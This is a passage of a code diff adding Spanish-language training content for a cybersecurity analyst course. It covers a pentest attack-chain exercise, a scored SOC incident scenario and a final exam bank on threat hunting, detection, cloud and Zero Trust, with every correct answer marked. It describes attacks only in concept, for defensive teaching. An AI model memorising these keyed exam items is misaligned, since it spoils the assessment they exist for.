+H2  Media    Contraseñas por defecto en la cuenta "soporte" del portal
+H3  Alta     El portal permite subir archivos sin validar su tipo (ejecución de código en el servidor)
+H4  Baja     Encabezados HTTP de seguridad ausentes
+H5  Media    El servidor del portal puede conectarse directamente a la base de datos de nómina
+Cadena demostrada: H2 → H3 → H5  (acceso al portal → control del servidor → lectura de la nómina)`,
+              },
+            ],
+            questions: [
+              { prompt: '¿Qué hallazgo da el acceso inicial en la cadena demostrada? (ej. H1)', answers: ['H2', 'h2'], explanation: 'H2: la contraseña por defecto de "soporte" abre la puerta.' },
+              { prompt: '¿Qué hallazgo permite ejecutar código en el servidor?', answers: ['H3', 'h3'], explanation: 'H3: subir archivos sin validar permite cargar código y ejecutarlo.' },
+              { prompt: '¿Qué hallazgo de severidad "Baja" puede dejarse para después sin afectar la cadena?', answers: ['H4', 'h4'], explanation: 'H4 no participa en la cadena. Romper H2 (cambiar la contraseña) es lo más rápido; H3 y H5 se corrigen después para que la cadena no se rearme por otro camino.' },
+            ],
+          },
+        ]
+      },
+      {
+        id: 'aca_capstone',
+        title: "7. 🧩 Caso Integrador: Turno Nocturno en el SOC",
+        content: [
+          { type: 'text', icon: 'AlarmIcon', text: "Es la 1:00 a. m. y usted está solo en el turno del SOC de una entidad ficticia. Las alertas empiezan a llegar. Este caso integra detección, priorización, contención y comunicación." },
+          {
+            type: 'scenario',
+            title: 'Caso integrador: la noche de las cinco alertas',
+            intro: "Cinco alertas en 20 minutos. Necesita 80 de 100 puntos.",
+            start: 'z1',
+            maxPoints: 100,
+            passPoints: 80,
+            steps: {
+              z1: {
+                text: "Llegan: (1) escaneo externo bloqueado, (2) inicio de sesión de un administrador desde otro país, (3) antivirus que eliminó un adjunto, (4) disco casi lleno en un servidor, (5) creación de una cuenta nueva en el dominio a la 1:05 a. m. ¿Qué atiende primero?",
+                choices: [
+                  { text: "La 2 y la 5 juntas: un administrador desde otro país y una cuenta creada a esa hora pueden ser el mismo ataque en curso.", next: 'z2', points: 20, feedback: "Correcto: correlacionar las alertas revela el incidente real." },
+                  { text: "La 1, porque llegó primero.", next: 'z2', points: 0, feedback: "Un escaneo bloqueado es ruido; el orden de llegada no es el riesgo." },
+                ]
+              },
+              z2: {
+                text: "Confirma que la cuenta nueva la creó el administrador conectado desde el exterior, que no está de viaje. ¿Qué hace?",
+                choices: [
+                  { text: "Deshabilito ambas cuentas, cierro sus sesiones y aíslo los equipos desde donde operaron, según el playbook de cuentas comprometidas.", next: 'z3', points: 20, feedback: "Bien: contención inmediata del acceso del atacante." },
+                  { text: "Espero a la mañana para consultarlo con el jefe.", next: 'z3', points: -10, feedback: "Unas horas de ventaja permiten al atacante desplegar ransomware." },
+                ]
+              },
+              z3: {
+                text: "El playbook exige escalar a ciertos niveles. ¿A quién avisa ahora?",
+                choices: [
+                  { text: "Al líder de respuesta a incidentes de guardia, según la matriz de escalamiento, con un resumen de lo observado y lo hecho.", next: 'z4', points: 20, feedback: "Correcto: un incidente de cuenta administradora comprometida no se maneja solo." },
+                  { text: "A nadie: ya lo contuve.", next: 'z4', points: -10, feedback: "Pueden existir otros accesos del atacante; se necesita al equipo completo." },
+                ]
+              },
+              z4: {
+                text: "Mientras llega el equipo, ¿qué busca?",
+                choices: [
+                  { text: "Otras acciones de esas cuentas: tareas programadas, nuevos servicios, accesos a otros servidores y cambios en los respaldos.", next: 'z5', points: 20, feedback: "Excelente: busca persistencia y movimiento lateral antes de que se usen." },
+                  { text: "Reviso por qué el disco del servidor está lleno.", next: 'z5', points: 0, feedback: "Puede esperar: no es la prioridad en este momento." },
+                ]
+              },
+              z5: {
+                text: "Al amanecer, ¿qué entrega?",
+                choices: [
+                  { text: "Un informe con línea de tiempo, alertas correlacionadas, acciones de contención, indicadores encontrados y una regla de detección nueva para este patrón.", next: 'fin', points: 20, feedback: "Cierre de nivel avanzado: lo aprendido se convierte en detección." },
+                  { text: "Un mensaje: \"Hubo algo raro, ya está controlado\".", next: 'fin', points: 0, feedback: "Sin detalle, el equipo no puede continuar ni aprender." },
+                ]
+              },
+              fin: { text: "Fin del turno. Si aprobó, está listo para el examen final." },
+            }
+          },
+        ]
+      },
+      {
+        id: 'aca_exam',
+        title: "8. 📝 Examen del Nivel Avanzado",
+        content: [
+          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final de la ruta Analista de Ciberseguridad: 12 preguntas al azar de un banco de 16, con 80% para aprobar." },
+          {
+            type: 'exam',
+            title: 'Examen: Analista de Ciberseguridad · Avanzado',
+            description: 'Evalúa threat hunting, ingeniería de detección, nube, Zero Trust, priorización de pentest y operación del SOC.',
+            passPercent: 80,
+            questionsPerAttempt: 12,
+            questions: [
+              { question: '¿De qué parte el threat hunting?', options: [{ id: 'x1a', text: 'De una hipótesis basada en técnicas reales de atacantes.', isCorrect: true, score: 10 }, { id: 'x1b', text: 'De esperar a que llegue una alerta.', isCorrect: false, score: 0 }, { id: 'x1c', text: 'De reinstalar los equipos.', isCorrect: false, score: 0 }], feedback: 'Es proactivo.' },
+              { question: 'WINWORD.EXE lanza powershell.exe con un comando codificado. ¿Qué sugiere?', options: [{ id: 'x2a', text: 'Un documento con macros que ejecutó código malicioso.', isCorrect: true, score: 10 }, { id: 'x2b', text: 'Una actualización normal de Office.', isCorrect: false, score: 0 }, { id: 'x2c', text: 'Nada relevante.', isCorrect: false, score: 0 }], feedback: 'Es un patrón clásico de acceso inicial.' },
+              { question: '¿Qué técnica de ATT&CK es la creación de una tarea programada para persistir?', options: [{ id: 'x3a', text: 'T1053.005.', isCorrect: true, score: 10 }, { id: 'x3b', text: 'T1566.', isCorrect: false, score: 0 }, { id: 'x3c', text: 'T1486.', isCorrect: false, score: 0 }], feedback: 'T1566 es phishing y T1486 cifrado para impacto.' },
+              { question: '¿Qué evento de Sysmon registra la creación de procesos?', options: [{ id: 'x4a', text: 'El ID 1.', isCorrect: true, score: 10 }, { id: 'x4b', text: 'El ID 1102.', isCorrect: false, score: 0 }, { id: 'x4c', text: 'El ID 4625.', isCorrect: false, score: 0 }], feedback: '1102 y 4625 son eventos de seguridad de Windows.' },
+              { question: '¿Qué es Sigma?', options: [{ id: 'x5a', text: 'Un formato abierto para escribir reglas de detección traducibles a distintos SIEM.', isCorrect: true, score: 10 }, { id: 'x5b', text: 'Un antivirus.', isCorrect: false, score: 0 }, { id: 'x5c', text: 'Un tipo de malware.', isCorrect: false, score: 0 }], feedback: 'Se escribe una vez y se usa en varias plataformas.' },
+              { question: 'Una regla de detección genera cientos de falsos positivos al día. ¿Qué riesgo hay?', options: [{ id: 'x6a', text: 'Que el equipo termine ignorándola y pase por alto el ataque real.', isCorrect: true, score: 10 }, { id: 'x6b', text: 'Ninguno: más alertas es mejor.', isCorrect: false, score: 0 }, { id: 'x6c', text: 'Que el SIEM se vuelva más rápido.', isCorrect: false, score: 0 }], feedback: 'La fatiga de alertas es un riesgo real.' },
+              { question: 'En el modelo de responsabilidad compartida de la nube, ¿de quién es la configuración de permisos?', options: [{ id: 'x7a', text: 'Del cliente.', isCorrect: true, score: 10 }, { id: 'x7b', text: 'Del proveedor de nube.', isCorrect: false, score: 0 }, { id: 'x7c', text: 'De nadie.', isCorrect: false, score: 0 }], feedback: 'El proveedor protege la infraestructura.' },
+              { question: 'Un almacenamiento en la nube con datos personales quedó público y hubo descargas de terceros. ¿Es un incidente?', options: [{ id: 'x8a', text: 'Sí: es una posible fuga de datos personales, aunque nadie "rompiera" nada.', isCorrect: true, score: 10 }, { id: 'x8b', text: 'No, porque no hubo hackeo.', isCorrect: false, score: 0 }, { id: 'x8c', text: 'Solo si sale en las noticias.', isCorrect: false, score: 0 }], feedback: 'Debe evaluarse y reportarse.' },
+              { question: '¿Qué hace una herramienta CSPM?', options: [{ id: 'x9a', text: 'Revisa continuamente la configuración de la nube en busca de errores.', isCorrect: true, score: 10 }, { id: 'x9b', text: 'Cifra los correos.', isCorrect: false, score: 0 }, { id: 'x9c', text: 'Reemplaza el firewall.', isCorrect: false, score: 0 }], feedback: 'Cloud Security Posture Management.' },
+              { question: '¿Qué documento del NIST describe la arquitectura Zero Trust?', options: [{ id: 'x10a', text: 'NIST SP 800-207.', isCorrect: true, score: 10 }, { id: 'x10b', text: 'NIST SP 800-61.', isCorrect: false, score: 0 }, { id: 'x10c', text: 'NIST SP 800-115.', isCorrect: false, score: 0 }], feedback: '800-61 es respuesta a incidentes y 800-115 pruebas de seguridad.' },
+              { question: '¿Qué significa "asumir el compromiso" en Zero Trust?', options: [{ id: 'x11a', text: 'Diseñar como si el atacante ya estuviera dentro, para limitar el daño.', isCorrect: true, score: 10 }, { id: 'x11b', text: 'Rendirse ante los atacantes.', isCorrect: false, score: 0 }, { id: 'x11c', text: 'No monitorear nada.', isCorrect: false, score: 0 }], feedback: 'Lleva a segmentar, cifrar y vigilar.' },
+              { question: '¿Qué limita principalmente la microsegmentación?', options: [{ id: 'x12a', text: 'El movimiento lateral.', isCorrect: true, score: 10 }, { id: 'x12b', text: 'El phishing.', isCorrect: false, score: 0 }, { id: 'x12c', text: 'El consumo de energía.', isCorrect: false, score: 0 }], feedback: 'Un equipo comprometido no llega a todo.' },
+              { question: 'En un informe de pentest, ¿qué es una cadena de ataque?', options: [{ id: 'x13a', text: 'Varios hallazgos combinados que llevan a un compromiso mayor.', isCorrect: true, score: 10 }, { id: 'x13b', text: 'La lista de hallazgos ordenada por fecha.', isCorrect: false, score: 0 }, { id: 'x13c', text: 'Un tipo de malware.', isCorrect: false, score: 0 }], feedback: 'Romper un eslabón puede detener toda la cadena.' },
+              { question: 'Llegan varias alertas a la vez. ¿Cómo se priorizan?', options: [{ id: 'x14a', text: 'Correlacionándolas y atendiendo primero lo que indica un ataque en curso.', isCorrect: true, score: 10 }, { id: 'x14b', text: 'Por orden de llegada.', isCorrect: false, score: 0 }, { id: 'x14c', text: 'Por la que tenga el título más largo.', isCorrect: false, score: 0 }], feedback: 'La correlación revela el incidente real.' },
+              { question: 'Confirmada una cuenta administradora comprometida de madrugada, ¿qué hace el analista?', options: [{ id: 'x15a', text: 'Contiene (deshabilita, cierra sesiones, aísla) y escala según la matriz.', isCorrect: true, score: 10 }, { id: 'x15b', text: 'Espera a la mañana.', isCorrect: false, score: 0 }, { id: 'x15c', text: 'Lo publica en redes.', isCorrect: false, score: 0 }], feedback: 'Horas de ventaja pueden ser fatales.' },
+              { question: '¿Cómo cierra un analista avanzado un incidente nuevo?', options: [{ id: 'x16a', text: 'Con un informe y una regla de detección para ese patrón.', isCorrect: true, score: 10 }, { id: 'x16b', text: 'Borrando los registros.', isCorrect: false, score: 0 }, { id: 'x16c', text: 'Sin documentar nada.', isCorrect: false, score: 0 }], feedback: 'Lo aprendido se convierte en detección.' },
+            ],
+          },
+        ]
+      },
+    ]
   }
 };
 
